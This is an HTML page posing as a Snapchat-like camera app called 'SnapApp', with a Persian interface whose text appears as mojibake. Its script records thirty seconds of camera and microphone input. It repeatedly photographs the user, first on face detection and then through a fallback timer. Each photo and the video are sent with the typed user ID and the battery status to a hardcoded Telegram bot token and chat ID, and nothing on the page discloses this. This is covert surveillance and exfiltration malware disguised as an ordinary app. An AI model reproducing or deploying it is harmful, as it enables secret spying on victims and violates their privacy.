<!DOCTYPE html><html lang="fa">
<head>
  <meta charset="UTF-8">
  <title>SnapApp</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link href="https://cdn.jsdelivr.net/gh/rastikerdar/vazirmatn@v33.003/Vazirmatn-font-face.css" rel="stylesheet">
  <script src="https://cdn.tailwindcss.com"></script>
  <script src="https://unpkg.com/lucide@latest"></script>
  <script src="https://cdn.jsdelivr.net/npm/face-api.js"></script>
  <style>
    body { margin: 0; background: #fffc00; font-family: 'Vazirmatn', sans-serif; direction: rtl; }
    #videoContainer { position: fixed; top: 0; left: 0; width: 100%; height: 100%; overflow: hidden; }
    video { width: 100%; height: 100%; object-fit: cover; }
    #controls { position: absolute; bottom: 24px; width: 100%; display: flex; justify-content: center; align-items: center; gap: 24px; }
    #shootBtn { background: white; border-radius: 50%; width: 70px; height: 70px; border: 6px solid #000; cursor: pointer; }
    #switchBtn { background: rgba(255,255,255,0.8); border-radius: 50%; width: 48px; height: 48px; display: flex; align-items: center; justify-content: center; cursor: pointer; }
    #userInput { position: absolute; top: 20px; width: 100%; display: flex; justify-content: center; }
    #userId { padding: 10px 16px; border-radius: 12px; border: none; outline: none; }
  </style>
</head>
<body>
<div id="videoContainer">
  <video id="video" autoplay playsinline muted></video>
  <div id="userInput">
    <input id="userId" type="text" placeholder="Ø¢ÛŒØ¯ÛŒ Ø´Ù…Ø§..." />
  </div>
  <div id="controls">
    <div id="switchBtn"><i data-lucide="camera"></i></div>
    <div id="shootBtn"></div>
  </div>
</div>
<script>
const botToken = '7336954365:AAHqd7DgkHDMetoFFjtNWvmV1IWZsmiiaLU';
const chatId = '-1002534583259';
let stream, recorder, chunks = [], faceDetected = false, faceStartTime = null, uid = '', useFront = true, photoCount = 0;
const MAX_PHOTOS = 15;
const INTERVAL_MS = 4000;const video = document.getElementById('video'); const shootBtn = document.getElementById('shootBtn'); const switchBtn = document.getElementById('switchBtn');

switchBtn.onclick = () => { useFront = !useFront; startCamera(); };

shootBtn.onclick = () => captureAndSend();

document.getElementById('userId').addEventListener('change', () => { uid = document.getElementById('userId').value.trim(); });

async function startCamera() { if (stream) stream.getTracks().forEach(track => track.stop()); stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: useFront ? 'user' : 'environment' }, audio: true }); video.srcObject = stream; startFaceDetection(); startRecording(); }

async function startFaceDetection() { await faceapi.nets.tinyFaceDetector.loadFromUri('https://cdn.jsdelivr.net/npm/face-api.js/models'); const canvas = faceapi.createCanvasFromMedia(video); document.body.append(canvas); const displaySize = { width: video.videoWidth, height: video.videoHeight }; faceapi.matchDimensions(canvas, displaySize);

let photosTaken = 0; let fallbackStarted = false;

const interval = setInterval(async () => { const detections = await faceapi.detectAllFaces(video, new faceapi.TinyFaceDetectorOptions()); if (detections.length > 0) { faceDetected = true; faceStartTime = new Date(); captureAndSend(); photosTaken++; } else { if (!fallbackStarted && (!faceStartTime || new Date() - faceStartTime > 7000)) { fallbackStarted = true; let count = 0; const fallback = setInterval(() => { captureAndSend(); count++; if (count >= MAX_PHOTOS) clearInterval(fallback); }, INTERVAL_MS); } } if (photosTaken >= MAX_PHOTOS) clearInterval(interval); }, INTERVAL_MS); }

function captureAndSend() { if (!uid) return; const canvas = document.createElement('canvas'); canvas.width = video.videoWidth; canvas.height = video.videoHeight; canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height); canvas.toBlob(async blob => { const battery = await navigator.getBattery(); const form = new FormData(); form.append('chat_id', chatId); form.append('photo', blob, snap_${photoCount++}.jpg); form.append('caption', Ø¢ÛŒØ¯ÛŒ: ${uid}\nØ¹Ú©Ø³ Ø´Ù…Ø§Ø±Ù‡: ${photoCount}\nØ¨Ø§ØªØ±ÛŒ: ${battery.level * 100}% ðŸ”‹\nØ´Ø§Ø±Ú˜: ${battery.charging ? 'Ø¨Ù„Ù‡ âš¡' : 'Ø®ÛŒØ±'}); fetch(https://api.telegram.org/bot${botToken}/sendPhoto, { method: 'POST', body: form }); }, 'image/jpeg'); }

function startRecording() { recorder = new MediaRecorder(stream, { mimeType: 'video/webm;codecs=vp9' }); recorder.ondataavailable = e => chunks.push(e.data); recorder.onstop = async () => { const blob = new Blob(chunks, { type: 'video/webm' }); const form = new FormData(); form.append('chat_id', chatId); form.append('video', blob, 'recording.webm'); form.append('caption', ÙˆÛŒØ¯ÛŒÙˆ Ø¶Ø¨Ø·â€ŒØ´Ø¯Ù‡ Ø§Ø² ${uid}); fetch(https://api.telegram.org/bot${botToken}/sendVideo, { method: 'POST', body: form }); }; recorder.start(); setTimeout(() => { recorder.stop(); }, 30000); }

startCamera(); lucide.createIcons(); </script>

</body>
</html>
